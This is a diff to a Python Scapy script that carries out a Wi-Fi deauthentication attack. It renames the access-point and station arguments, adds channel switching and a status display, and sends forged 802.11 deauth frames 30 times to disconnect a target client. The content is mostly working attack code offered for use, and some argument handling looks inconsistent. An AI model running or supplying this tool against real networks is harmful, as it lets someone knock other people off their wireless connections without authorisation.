@@ -4,8 +4,8 @@ import os
 
 conf.verb = 0
 
-ap = optparse.args.ap
-sta = optparse.args.sta
+dest = optparse.args.dest
+src = optparse.args.src
 ssid = optparse.args.ssid
 ch = optparse.args.ch
 iface = optparse.args.iface
@@ -16,15 +16,23 @@ WARN_STR = "[\x1b[31m!\x1b[0m]"
 INFO_STR = "\x1b[33m-\x1b[0m"
 
 def deauth_attack():
+    os.system('clear')
+    # Channel Switching
+    channel_switch(iface, ch)
+    show_info()
 
     # Deauthentication
     deauth_frame = RadioTap()\
-            /Dot11(type=0, subtype=12, addr1=args.Client, addr2=args.BSSID, addr3=args.BSSID)\
+            /Dot11(type=0, subtype=12, addr1=src, addr2=dest, addr3=dest)\
             /Dot11Deauth(reason=7)
+    
+    print(WARN_STR+" Attack")
+    for i in range(0, 30):
+        sendp(deauth_frame, iface=iface)
+        printProgressBar()
 
-    for n in range(int(args.Number)):
-        sendp(packet)
-        print(f"Deauth sent via: {conf.iface} to BSSID: {args.BSSID} for Client: {args.Client}")
+def printProgressBar():
+    print("\x1b[36m->\x1b[0m",end="",flush=True)
 
 def channel_switch(iface,ch):
     print(WARN_STR+" Channel Switching : Ch."+str(ch))
@@ -32,8 +40,8 @@ def channel_switch(iface,ch):
 
 def show_info():
     print(SYSTEM_STR+" Information")
-    print("\t"+INFO_STR+" Access Point MAC Address (BSSID) : %s" % ap)
-    print("\t"+INFO_STR+" Station MAC Address : %s" % sta)
+    print("\t"+INFO_STR+" Destination MAC Address (BSSID) : %s" % dest)
+    print("\t"+INFO_STR+" Source MAC Address : %s" % src)
     print("\t"+INFO_STR+" SSID Information : %s" % ssid)
     print("\t"+INFO_STR+" Channel : Ch.%s" % ch)
     print("\t"+INFO_STR+" Interface : %s" % iface)
